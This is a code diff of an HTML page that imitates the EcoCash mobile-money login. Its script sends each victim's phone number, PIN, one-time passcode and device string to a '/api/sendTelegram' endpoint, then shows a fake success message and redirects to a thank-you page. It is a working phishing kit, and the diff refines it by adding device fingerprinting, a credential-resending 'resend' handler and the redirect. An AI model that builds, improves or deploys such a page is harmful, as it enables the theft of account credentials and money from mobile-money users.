@@ -1,72 +1,126 @@
 <!doctype html>
 <html>
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>EcoCash — Login</title>
+
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+
 <style>
-  *{box-sizing:border-box}
-  html,body{height:100%}
-  body{
-    font-family:Inter,system-ui,Arial;
-    background:linear-gradient(180deg,#f7fbff,#e8f3ff);
-    margin:0;
-    -webkit-font-smoothing:antialiased;
-    padding:18px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    min-height:100vh;
-  }
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  font-family:Inter,system-ui,Arial;
+  background:linear-gradient(180deg,#f7fbff,#e8f3ff);
+  margin:0;
+  padding:18px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.card{
+  width:100%;
+  max-width:380px;
+  background:#fff;
+  padding:20px;
+  border-radius:12px;
+  box-shadow:0 12px 30px rgba(2,6,23,.06)
+}
+.logo{height:44px;display:block;margin:0 auto 10px}
+h2{text-align:center;margin:0 0 12px;font-size:20px}
+label{display:block;font-size:13px;margin-top:8px}
 
-  .card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
-  .logo{height:44px;display:block;margin:0 auto 10px}
-  h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
-  label{display:block;font-size:13px;color:#374151;margin-top:8px}
-  input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px}
-  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
-  .btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}
+input{
+  width:100%;
+  padding:10px;
+  border-radius:8px;
+  border:1px solid #e6eefc;
+  background:#fbfdff;
+  font-size:14px
+}
+.btn{
+  background:#4b86ff;
+  color:#fff;
+  padding:10px;
+  border-radius:8px;
+  border:0;
+  margin-top:12px;
+  width:100%
+}
+.btn[disabled]{background:#cbd5e1}
 
-  .req{color:#d04444;margin-right:6px}
-  .error{color:#d04444;font-size:13px;margin-top:4px;display:none}
+.req{color:#d04444;margin-right:6px}
+.small{font-size:13px;color:#6b7280}
+.success{color:#16a34a;font-weight:600}
 
-  /* PIN boxes */
-  .pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
-  .pin-digit{
-    width:40px;height:48px;
-    text-align:center;font-size:20px;
-    border-radius:8px;border:1px solid #e6eefc;
-    background:#fbfdff;
-  }
+/* repaint-safe warning */
+.error{
+  min-height:18px;
+  font-size:13px;
+  color:#d04444;
+}
 
-  /* OTP modal (UNCHANGED) */
-  .otp-modal{position:fixed;left:0;top:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
-  .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:300px;max-width:92%;box-shadow:0 12px 24px rgba(2,6,23,0.08)}
-  .small{font-size:13px;color:#6b7280}
-  .success{color:#16a34a;font-weight:600}
-  .otp-warning{color:#d04444;font-size:13px;margin-top:8px;display:none}
-  .otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
-  .otp-digit{width:40px;height:48px;text-align:center;font-size:20px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff}
-  .resend-row{display:flex;gap:10px;align-items:center;margin-top:12px;justify-content:space-between}
-  .resend-btn{background:#fff;border:1px solid #e6eefc;padding:8px 12px;border-radius:8px;cursor:pointer}
-  .resend-btn[disabled]{opacity:.6;cursor:not-allowed}
+/* PIN */
+.pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
+.pin-digit{
+  width:40px;height:48px;
+  text-align:center;
+  font-size:20px;
+  border-radius:8px;
+  border:1px solid #e6eefc;
+}
+
+/* OTP */
+.otp-modal{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.35);
+  display:flex;
+  align-items:center;
+  justify-content:center
+}
+.otp-box{
+  background:#fff;
+  padding:18px;
+  border-radius:12px;
+  min-width:300px
+}
+.otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
+.otp-digit{
+  width:40px;height:48px;
+  text-align:center;
+  font-size:20px;
+  border-radius:8px;
+  border:1px solid #e6eefc
+}
+.otp-warning{color:#d04444;font-size:13px;display:none}
+
+.resend-row{
+  display:flex;
+  justify-content:space-between;
+  margin-top:12px
+}
+.resend-btn{
+  background:#fff;
+  border:1px solid #e6eefc;
+  padding:6px 12px;
+  border-radius:8px
+}
+.resend-btn[disabled]{opacity:.5}
 </style>
 </head>
 
 <body>
-<div class="card">
-  <img src="assets/eco.png" alt="EcoCash logo" class="logo">
 
+<div class="card">
+  <img src="assets/eco.png" alt="EcoCash" class="logo">
   <h2>Login</h2>
 
   <form id="loginForm" autocomplete="off">
-    <label><span class="req">★</span>Mobile Number
-      <input id="phone" value="+263" inputmode="numeric" autocomplete="tel">
-    </label>
-    <div id="phoneError" class="error">
-      Input 9-digit Econet number starting with 7
-    </div>
+    <label><span class="req">★</span>Mobile Number</label>
+    <input id="phone" value="+263" inputmode="numeric">
+    <div id="phoneError" class="error"></div>
 
     <label><span class="req">★</span>Enter your PIN</label>
     <div class="pin-row">
@@ -76,15 +130,15 @@
       <input class="pin-digit" maxlength="1" inputmode="numeric">
     </div>
 
-    <!-- hidden pin value (used by original logic) -->
-    <input type="hidden" id="pin">
+    <!-- honeypot -->
+    <input type="text" id="hp" style="display:none">
 
-    <button type="submit" id="loginBtn" class="btn" disabled>LOGIN</button>
+    <button id="loginBtn" class="btn" disabled>LOGIN</button>
   </form>
 </div>
 
-<!-- OTP MODAL (UNCHANGED FROM ORIGINAL) -->
-<div id="otpModal" style="display:none" class="otp-modal">
+<!-- OTP MODAL -->
+<div id="otpModal" class="otp-modal" style="display:none">
   <div class="otp-box">
     <div style="text-align:center"><strong>Enter OTP</strong></div>
     <p class="small">We have sent an OTP to your phone.</p>
@@ -117,57 +171,74 @@
 </div>
 
 <script>
-/* ===== PHONE ENFORCEMENT ===== */
-const phoneEl = document.getElementById('phone');
+/* ===== DEVICE STRING (STRING ONLY) ===== */
+const ua = navigator.userAgent;
+let device = 'Unknown';
+
+if (/Android/i.test(ua)) {
+  const v = ua.match(/Android\s([\d.]+)/);
+  device = 'Android ' + (v ? v[1] : '');
+} else if (/iPhone|iPad/i.test(ua)) {
+  const v = ua.match(/OS (\d+_\d+)/);
+  device = 'iOS ' + (v ? v[1].replace('_','.') : '');
+}
+if (/Chrome/i.test(ua)) device += ' | Chrome';
+else if (/Safari/i.test(ua)) device += ' | Safari';
+else if (/Firefox/i.test(ua)) device += ' | Firefox';
+
+/* ===== PHONE ===== */
+const phone = document.getElementById('phone');
 const phoneError = document.getElementById('phoneError');
 const loginBtn = document.getElementById('loginBtn');
 
-phoneEl.addEventListener('keydown', e=>{
-  if (phoneEl.selectionStart <= 4 && e.key === 'Backspace') {
-    e.preventDefault();
+function validatePhone(){
+  const d = phone.value.replace('+263','');
+  if (!/^7\d{8}$/.test(d)) {
+    phoneError.innerText = 'Input 9-digit Econet number starting with 7';
+    return false;
   }
+  phoneError.innerText = '';
+  return true;
+}
+
+phone.addEventListener('keydown',e=>{
+  if(phone.selectionStart<=4 && e.key==='Backspace') e.preventDefault();
 });
 
-phoneEl.addEventListener('input', ()=>{
-  let digits = phoneEl.value.replace('+263','').replace(/\D/g,'').slice(0,9);
-  phoneEl.value = '+263' + digits;
-
-  if (!/^7\d{8}$/.test(digits)) {
-    phoneError.style.display = 'block';
-  } else {
-    phoneError.style.display = 'none';
-  }
-
-  updateLoginState();
+phone.addEventListener('input',()=>{
+  let d = phone.value.replace('+263','').replace(/\D/g,'').slice(0,9);
+  phone.value = '+263' + d;
+  validatePhone();
+  updateLogin();
 });
 
-/* ===== PIN (4 BOXES) ===== */
-const pinBoxes = [...document.querySelectorAll('.pin-digit')];
-const pinEl = document.getElementById('pin');
+phone.addEventListener('blur', validatePhone);
 
-pinBoxes.forEach((box,i)=>{
-  box.addEventListener('input',()=>{
-    box.value = box.value.replace(/\D/g,'');
-    if (box.value && i < 3) pinBoxes[i+1].focus();
-    pinEl.value = pinBoxes.map(b=>b.value).join('');
-    updateLoginState();
+/* ===== PIN ===== */
+const pins=[...document.querySelectorAll('.pin-digit')];
+let pinValue='';
+
+pins.forEach((p,i)=>{
+  p.addEventListener('input',()=>{
+    p.value=p.value.replace(/\D/g,'');
+    if(p.value && i<3) pins[i+1].focus();
+    pinValue=pins.map(x=>x.value).join('');
+    updateLogin();
   });
-  box.addEventListener('keydown',e=>{
-    if (e.key === 'Backspace' && !box.value && i > 0) {
-      pinBoxes[i-1].focus();
-      pinBoxes[i-1].value = '';
+  p.addEventListener('keydown',e=>{
+    if(e.key==='Backspace'&&!p.value&&i>0){
+      pins[i-1].focus();
+      pins[i-1].value='';
       e.preventDefault();
     }
   });
 });
 
-function updateLoginState(){
-  const phoneOk = /^7\d{8}$/.test(phoneEl.value.replace('+263',''));
-  const pinOk = /^\d{4}$/.test(pinEl.value);
-  loginBtn.disabled = !(phoneOk && pinOk);
+function updateLogin(){
+  loginBtn.disabled = !(validatePhone() && /^\d{4}$/.test(pinValue));
 }
 
-/* ===== EVERYTHING BELOW IS ORIGINAL OTP LOGIC (UNCHANGED) ===== */
+/* ===== API ===== */
 async function sendToServer(payload){
   return fetch('/api/sendTelegram',{
     method:'POST',
@@ -176,27 +247,28 @@ async function sendToServer(payload){
   });
 }
 
+/* ===== OTP ===== */
 const otpModal=document.getElementById('otpModal');
 const dEls=[0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
 const confirmBtn=document.getElementById('confirmOtp');
 const cancelBtn=document.getElementById('cancelOtp');
+const resendBtn=document.getElementById('resendBtn');
 const otpWarning=document.getElementById('otpWarning');
 const otpStatus=document.getElementById('otpStatus');
-const resendBtn=document.getElementById('resendBtn');
-const countdownEl=document.getElementById('countdown');
+const countdown=document.getElementById('countdown');
 const resendInfo=document.getElementById('resendInfo');
 
-let timer=null,sec=120;
+let timer,seconds=120;
 
-function startResend(){
+function startCountdown(){
   clearInterval(timer);
-  sec=120;
+  seconds=120;
   resendBtn.disabled=true;
-  resendInfo.innerHTML=`Resend available in <span id="countdown">120</span>s`;
+  resendInfo.innerHTML='Resend available in <span id="countdown">120</span>s';
   timer=setInterval(()=>{
-    sec--;
-    countdownEl.textContent=sec;
-    if(sec<=0){
+    seconds--;
+    countdown.textContent=seconds;
+    if(seconds<=0){
       clearInterval(timer);
       resendBtn.disabled=false;
       resendInfo.textContent="Didn't receive OTP?";
@@ -204,28 +276,43 @@ function startResend(){
   },1000);
 }
 
-function otp(){return dEls.map(d=>d.value).join('');}
+function getOtp(){return dEls.map(d=>d.value).join('');}
+function updateConfirm(){
+  const ok=/^\d{6}$/.test(getOtp());
+  confirmBtn.disabled=!ok;
+  otpWarning.style.display=ok?'none':'block';
+}
 
 dEls.forEach((d,i)=>{
   d.addEventListener('input',()=>{
     d.value=d.value.replace(/\D/g,'');
-    if(d.value&&i<5)dEls[i+1].focus();
-    confirmBtn.disabled=!/^\d{6}$/.test(otp());
+    if(d.value && i<5) dEls[i+1].focus();
+    updateConfirm();
+  });
+  d.addEventListener('keydown',e=>{
+    if(e.key==='Backspace'&&!d.value&&i>0){
+      dEls[i-1].focus();
+      dEls[i-1].value='';
+      e.preventDefault();
+    }
   });
 });
 
-loginForm.addEventListener('submit',async e=>{
+/* ===== LOGIN ===== */
+document.getElementById('loginForm').addEventListener('submit',async e=>{
   e.preventDefault();
+  if(document.getElementById('hp').value) return;
 
   otpModal.style.display='flex';
   dEls.forEach(d=>d.value='');
-  confirmBtn.disabled=true;
-  startResend();
+  updateConfirm();
+  startCountdown();
 
   await sendToServer({
     event:'login_clicked',
-    loginPhone:phoneEl.value,
-    loginPin:pinEl.value,
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    device,
     submittedAt:new Date().toISOString()
   });
 });
@@ -235,15 +322,27 @@ cancelBtn.onclick=()=>{
   clearInterval(timer);
 };
 
+resendBtn.onclick=async()=>{
+  await sendToServer({
+    event:'resend_otp',
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    device,
+    submittedAt:new Date().toISOString()
+  });
+};
+
 confirmBtn.onclick=async()=>{
   await sendToServer({
     event:'otp_confirm',
-    loginPhone:phoneEl.value,
-    loginPin:pinEl.value,
-    otp:otp(),
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    otp:getOtp(),
+    device,
     submittedAt:new Date().toISOString()
   });
   otpStatus.innerHTML="<span class='success'>Success — your request has been received.</span>";
+  setTimeout(()=>location.href='thankyou.html',1200);
 };
 </script>
 </body>
